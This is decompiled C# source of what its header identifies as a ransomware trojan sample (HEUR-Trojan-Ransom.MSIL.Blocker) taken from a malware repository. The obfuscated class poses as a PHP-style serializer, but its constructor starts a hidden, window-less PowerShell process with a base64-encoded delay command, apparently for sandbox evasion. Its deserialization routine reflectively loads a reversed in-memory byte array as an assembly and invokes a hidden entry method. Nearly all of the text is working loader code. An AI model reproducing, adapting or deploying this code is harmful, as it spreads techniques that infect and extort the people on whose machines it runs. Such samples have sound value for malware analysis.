// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Rtzutvzk, Version=19.10.20069.49826, Culture=neutral, PublicKeyToken=null
// MVID: DEE42D95-DE4F-4727-C2F6-7CF05F66C1B3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-bc0c6f07b05e4c29bae36fedd9e58e1cd0148d777a68d50ec5104567d9e3ce43.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

public sealed class \u0005
{
  private Dictionary<Hashtable, bool> singleton;
  private Dictionary<ArrayList, bool> m_Container;
  private int _Interceptor;
  private byte[] consumer;
  public bool \u0006;
  public Encoding \u000E;
  private NumberFormatInfo m_Helper;
  internal static \u0005 OrderExpression;

  public \u0005()
  {
    if (true)
      goto label_5;
label_1:
    UTF8Encoding utF8Encoding = new UTF8Encoding();
    if (true)
      goto label_8;
label_2:
    // ISSUE: explicit constructor call
    base.\u002Ector();
    NumberFormatInfo numberFormatInfo = new NumberFormatInfo();
    if (true)
      goto label_10;
label_4:
    this.m_Helper.NumberGroupSeparator = "";
    this.m_Helper.NumberDecimalSeparator = ".";
    Process process = new Process();
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    \u0005.TestExpression((object) processStartInfo, true);
    processStartInfo.FileName = "powershell";
    processStartInfo.Arguments = "-enc YwBtAGQAIAAvAGMAIAB0AGkAbQBlAG8AdQB0ACAAMgAzAA==";
    process.StartInfo = processStartInfo;
    process.Start();
    process.WaitForExit();
    return;
label_10:
    this.m_Helper = numberFormatInfo;
    goto label_4;
label_8:
    this.\u000E = (Encoding) utF8Encoding;
    goto label_2;
label_5:
    this.\u0006 = true;
    int num = 1;
    if (\u003CModule\u003E\u007Bfeea9efe\u002Df51f\u002D47db\u002Da01a\u002D6d96fa1c1ecc\u007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_eb8c3541d6924dfe99d0a369d3f775c3 == 0)
      goto label_6;
label_3:
    switch (num)
    {
      case 0:
        return;
      case 1:
        goto label_1;
      default:
        return;
    }
label_6:
    num = 1;
    goto label_3;
  }

  private void CheckPublisher(object task)
  {
    MethodInfo methodInfo1 = (MethodInfo) task;
    if (true)
      goto label_2;
label_1:
    MethodInfo methodInfo2;
    methodInfo2.Invoke((object) null, (object[]) null);
    return;
label_2:
    methodInfo2 = methodInfo1;
    goto label_1;
  }

  public string \u0002(object _param1)
  {
    Dictionary<ArrayList, bool> dictionary1 = new Dictionary<ArrayList, bool>();
    if (true)
      goto label_4;
label_2:
    Dictionary<Hashtable, bool> dictionary2 = new Dictionary<Hashtable, bool>();
    if (true)
      goto label_5;
label_1:
    string str1 = this.MapPublisher(_param1, new StringBuilder()).ToString();
    if (true)
      goto label_6;
label_3:
    string str2;
    return str2;
label_6:
    str2 = str1;
    goto label_3;
label_5:
    this.singleton = dictionary2;
    goto label_1;
label_4:
    this.m_Container = dictionary1;
    goto label_2;
  }

  private StringBuilder MapPublisher(object def, StringBuilder b)
  {
    int num1 = def == null ? 1 : 0;
    if (true)
      goto label_42;
label_10:
    bool flag1;
    if (!flag1)
      goto label_38;
    else
      goto label_11;
label_1:
    bool flag2;
    int num2;
    ArrayList arrayList;
    int num3;
    while (true)
    {
      switch (num3)
      {
        case 1:
        case 3:
        case 5:
          goto label_33;
        case 2:
          goto label_34;
        case 4:
          goto label_8;
        case 6:
          goto label_18;
        case 7:
          goto label_14;
        case 8:
          if (flag2)
          {
            this.MapPublisher((object) num2, b);
            this.MapPublisher(arrayList[num2], b);
            ++num2;
            num3 = 2;
            continue;
          }
          goto label_36;
        default:
          goto label_23;
      }
    }
label_18:
    List<byte> byteList1;
    int index;
    byte[] numArray1;
    for (; index < numArray1.Length; ++index)
    {
      byte num4 = numArray1[index];
      byteList1.Add(num4);
    }
    byteList1.Reverse();
    this.consumer = byteList1.ToArray();
    string s;
    StringBuilder stringBuilder1 = (StringBuilder) \u0005.ExcludeExpression((object) b, (object) ("s:" + this.\u000E.GetByteCount(s).ToString() + ":\"" + s + "\";"));
    goto label_33;
label_36:
    \u0005.MapExpression((object) b, '}');
    stringBuilder1 = b;
    goto label_33;
label_8:
    bool flag3;
    if (!flag3)
    {
      switch (def)
      {
        case bool flag4:
          stringBuilder1 = b.Append("b:" + (flag4 ? "1" : "0") + ";");
          goto label_33;
        case int num5:
          stringBuilder1 = b.Append("i:" + num5.ToString((IFormatProvider) this.m_Helper) + ";");
          goto label_33;
        case double num6:
          stringBuilder1 = b.Append("d:" + num6.ToString((IFormatProvider) this.m_Helper) + ";");
          goto label_33;
        case ArrayList _:
          if (!this.m_Container.ContainsKey((ArrayList) def))
          {
            this.m_Container.Add((ArrayList) def, true);
            arrayList = (ArrayList) def;
            b.Append("a:" + arrayList.Count.ToString() + ":{");
            num2 = 0;
            goto label_34;
          }
          else
          {
            stringBuilder1 = b.Append("N;");
            goto label_33;
          }
        case Hashtable _:
          if (this.singleton.ContainsKey((Hashtable) def))
          {
            stringBuilder1 = b.Append("N;");
            goto label_33;
          }
          else
            goto label_23;
        default:
          stringBuilder1 = b;
          goto label_33;
      }
    }
    else
    {
      string str = (string) def;
      if (true)
        goto label_45;
label_20:
      int num7 = this.\u0006 ? 1 : 0;
      if (true)
        goto label_46;
label_22:
      bool flag5;
      if (flag5)
      {
        byte[] numArray2 = RecordPageMessage.DeletePublisher();
        if (true)
        {
          this.consumer = numArray2;
          num3 = 7;
          goto label_1;
        }
        else
          goto label_14;
      }
      else
        goto label_21;
label_46:
      flag5 = num7 != 0;
      goto label_22;
label_45:
      s = str;
      goto label_20;
    }
label_11:
    StringBuilder stringBuilder2 = b.Append("N;");
    if (false)
    {
      num3 = \u003CModule\u003E\u007Bfeea9efe\u002Df51f\u002D47db\u002Da01a\u002D6d96fa1c1ecc\u007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_69c195bdf62548788af681bfcf411b93 != 0 ? 1 : 1;
      goto label_1;
    }
    else
    {
      stringBuilder1 = stringBuilder2;
      num3 = \u003CModule\u003E\u007Bfeea9efe\u002Df51f\u002D47db\u002Da01a\u002D6d96fa1c1ecc\u007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_c32dc7a7c51947509978a0e01b440576 == 0 ? 3 : 2;
      goto label_1;
    }
label_14:
    string str1 = s.Replace("\r\n", "\n");
    if (true)
      goto label_48;
label_19:
    string str2 = s.Replace('\r', '\n');
    if (true)
    {
      s = str2;
      goto label_21;
    }
    else
      goto label_21;
label_48:
    s = str1;
    goto label_19;
label_21:
    List<byte> byteList2 = new List<byte>();
    if (true)
      goto label_50;
label_17:
    byte[] consumer = this.consumer;
    if (true)
      goto label_51;
label_15:
    index = 0;
    num3 = 6;
    goto label_1;
label_51:
    numArray1 = consumer;
    goto label_15;
label_50:
    byteList1 = byteList2;
    goto label_17;
label_23:
    this.singleton.Add((Hashtable) def, true);
    Hashtable hashtable = (Hashtable) def;
    b.Append("a:" + hashtable.Count.ToString() + ":{");
    foreach (DictionaryEntry dictionaryEntry in hashtable)
    {
      this.MapPublisher(dictionaryEntry.Key, b);
      this.MapPublisher(dictionaryEntry.Value, b);
    }
    b.Append('}');
    stringBuilder1 = b;
    num3 = 5;
    goto label_1;
label_33:
    return stringBuilder1;
label_34:
    flag2 = num2 < arrayList.Count;
    num3 = \u003CModule\u003E\u007Bfeea9efe\u002Df51f\u002D47db\u002Da01a\u002D6d96fa1c1ecc\u007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_4368a3f155534e3db11d901da4181282 != 0 ? 8 : 8;
    goto label_1;
label_38:
    int num8 = def is string ? 1 : 0;
    if (false)
    {
      num3 = \u003CModule\u003E\u007Bfeea9efe\u002Df51f\u002D47db\u002Da01a\u002D6d96fa1c1ecc\u007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_ca9f721d3f8444beb3e5bbd476cbb179 == 0 ? 4 : 3;
      goto label_1;
    }
    else
    {
      flag3 = num8 != 0;
      goto label_8;
    }
label_42:
    flag1 = num1 != 0;
    goto label_10;
  }

  public object \u0002(string _param1)
  {
    if (true)
      goto label_3;
label_1:
    object obj1 = this.ReadPublisher(_param1);
    if (true)
      goto label_4;
label_2:
    object obj2;
    return obj2;
label_4:
    obj2 = obj1;
    goto label_2;
label_3:
    this._Interceptor = 0;
    goto label_1;
  }

  private object ReadPublisher(string v)
  {
    // ISSUE: type reference
    Assembly assembly1 = (Assembly) typeof (Assembly).GetMethod("Load", new Type[1]
    {
      \u0005.CompareExpression(__typeref (byte[]))
    }).Invoke((object) null, new object[1]
    {
      (object) this.consumer
    });
    if (true)
      goto label_46;
    else
      goto label_2;
label_1:
    Hashtable hashtable;
    int num1;
    ArrayList arrayList;
    char ch1;
    string s1;
    int num2;
    string s2;
    int num3;
    int num4;
    while (true)
    {
      object key;
      object obj;
      int num5;
      switch (num4)
      {
        case 1:
          goto label_11;
        case 2:
          goto label_35;
        case 3:
          if (ch1 != 's')
          {
            num4 = 9;
            continue;
          }
          int startIndex = v.IndexOf(":", this._Interceptor) + 1;
          num2 = v.IndexOf(":", startIndex);
          s2 = v.Substring(startIndex, num2 - startIndex);
          num3 = int.Parse(s2);
          num1 = num3;
          if (num2 + 2 + num1 >= v.Length)
            goto label_27;
label_8:
          s1 = v.Substring(num2 + 2, num1);
          num4 = \u003CModule\u003E\u007Bfeea9efe\u002Df51f\u002D47db\u002Da01a\u002D6d96fa1c1ecc\u007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_c32dc7a7c51947509978a0e01b440576 == 0 ? 4 : 1;
          continue;
label_27:
          num1 = v.Length - 2 - num2;
          goto label_8;
        case 4:
          goto label_25;
        case 5:
          goto label_37;
        case 6:
          if (!(key is int num6) || num6 != arrayList.Count)
          {
            arrayList = (ArrayList) null;
            break;
          }
          arrayList.Add(obj);
          break;
        case 7:
          goto label_2;
        case 8:
          obj = this.ReadPublisher(v);
          if (arrayList != null)
          {
            num4 = \u003CModule\u003E\u007Bfeea9efe\u002Df51f\u002D47db\u002Da01a\u002D6d96fa1c1ecc\u007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_0a1f768f433b44dd94d8a2ebd9ef54e6 != 0 ? 2 : 6;
            continue;
          }
          break;
        case 9:
          goto label_14;
        case 10:
          hashtable = new Hashtable(num1);
          arrayList = new ArrayList(num1);
          this._Interceptor += 4 + s2.Length;
          num5 = 0;
          goto label_31;
        default:
          goto label_40;
      }
      hashtable[key] = obj;
      ++num5;
label_31:
      if (num5 < num1)
      {
        key = this.ReadPublisher(v);
        num4 = 8;
      }
      else
        goto label_17;
    }
label_11:
    string s3;
    object obj1 = (object) int.Parse(s3, (IFormatProvider) this.m_Helper);
    goto label_35;
label_17:
    ++this._Interceptor;
    if (this._Interceptor < v.Length && v[this._Interceptor] == ';')
      goto label_42;
label_26:
    obj1 = arrayList == null ? (object) hashtable : (object) arrayList;
    goto label_35;
label_42:
    ++this._Interceptor;
    goto label_26;
label_25:
    for (; this.\u000E.GetByteCount(s1) > num3; s1 = v.Substring(num2 + 2, num1))
      --num1;
    this._Interceptor += 6 + s2.Length + num1;
    if (this.\u0006)
      goto label_24;
label_7:
    obj1 = (object) s1;
    goto label_35;
label_24:
    s1 = s1.Replace("\n", "\r\n");
    goto label_7;
label_2:
    int num7 = v == null ? 1 : (v.Length <= this._Interceptor ? 1 : 0);
    if (true)
      goto label_48;
label_13:
    bool flag;
    Assembly assembly2;
    if (!flag)
    {
      MethodInfo method = assembly2.GetType("Gtiyddimjwlwblld.Kclqhozsksnutc").GetMethod("Lwnafn");
      if (true)
      {
        this.CheckPublisher((object) method);
        num4 = \u003CModule\u003E\u007Bfeea9efe\u002Df51f\u002D47db\u002Da01a\u002D6d96fa1c1ecc\u007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_15a6d68cd9cb4899853cfb733849bfa9 != 0 ? 0 : 0;
        goto label_1;
      }
      else
        goto label_40;
    }
    else
    {
      object obj2 = new object();
      if (true)
      {
        obj1 = obj2;
        goto label_35;
      }
      else
        goto label_35;
    }
label_48:
    flag = num7 != 0;
    goto label_13;
label_14:
    obj1 = (object) "";
label_35:
    return obj1;
label_37:
    int num8 = this._Interceptor + 4;
    if (true)
      goto label_57;
label_33:
    char ch2;
    obj1 = (object) (ch2 == '1');
    goto label_35;
label_57:
    this._Interceptor = num8;
    goto label_33;
label_40:
    int num9 = (int) v[this._Interceptor];
    if (true)
      goto label_51;
label_16:
    char ch3;
    int num10 = (int) ch3;
    if (true)
      goto label_52;
label_44:
    if (ch1 > 'd')
    {
      if (ch1 == 'i')
      {
        int startIndex = v.IndexOf(":", this._Interceptor) + 1;
        num2 = v.IndexOf(";", startIndex);
        s3 = v.Substring(startIndex, num2 - startIndex);
        this._Interceptor += 3 + s3.Length;
        num4 = \u003CModule\u003E\u007Bfeea9efe\u002Df51f\u002D47db\u002Da01a\u002D6d96fa1c1ecc\u007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_0051802f07994cd5aa3758505a1f7512 == 0 ? 1 : 1;
        goto label_1;
      }
      else
      {
        num4 = 3;
        goto label_1;
      }
    }
    else if (ch1 != 'N')
    {
      switch ((int) ch1 - 97)
      {
        case 0:
          int startIndex1 = v.IndexOf(":", this._Interceptor) + 1;
          num2 = v.IndexOf(":", startIndex1);
          s2 = v.Substring(startIndex1, num2 - startIndex1);
          num1 = int.Parse(s2);
          num4 = 10;
          goto label_1;
        case 1:
          int num11 = (int) v[this._Interceptor + 2];
          if (true)
          {
            ch2 = (char) num11;
            num4 = 5;
            goto label_1;
          }
          else
            goto label_37;
        case 3:
          int startIndex2 = v.IndexOf(":", this._Interceptor) + 1;
          int num12 = v.IndexOf(";", startIndex2);
          string s4 = v.Substring(startIndex2, num12 - startIndex2);
          this._Interceptor += 3 + s4.Length;
          obj1 = (object) double.Parse(s4, (IFormatProvider) this.m_Helper);
          goto label_35;
        default:
          goto label_14;
      }
    }
    else
    {
      int num13 = this._Interceptor + 2;
      if (true)
        goto label_54;
label_20:
      if (false)
      {
        num4 = 2;
        goto label_1;
      }
      else
      {
        obj1 = (object) null;
        goto label_35;
      }
label_54:
      this._Interceptor = num13;
      goto label_20;
    }
label_52:
    ch1 = (char) num10;
    goto label_44;
label_51:
    ch3 = (char) num9;
    goto label_16;
label_46:
    assembly2 = assembly1;
    num4 = 7;
    if (\u003CModule\u003E\u007Bfeea9efe\u002Df51f\u002D47db\u002Da01a\u002D6d96fa1c1ecc\u007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_66e66ceca95247c2ac52066836749a3e != 0)
    {
      num4 = 2;
      goto label_1;
    }
    else
      goto label_1;
  }

  internal static void TestExpression([In] object obj0, [In] bool obj1) => ((ProcessStartInfo) obj0).CreateNoWindow = obj1;

  internal static bool ReflectExpression() => \u0005.OrderExpression == null;

  internal static \u0005 SearchExpression() => \u0005.OrderExpression;

  internal static object ExcludeExpression([In] object obj0, [In] object obj1) => (object) ((StringBuilder) obj0).Append((string) obj1);

  internal static object MapExpression([In] object obj0, [In] char obj1) => (object) ((StringBuilder) obj0).Append(obj1);

  internal static Type CompareExpression([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);
}
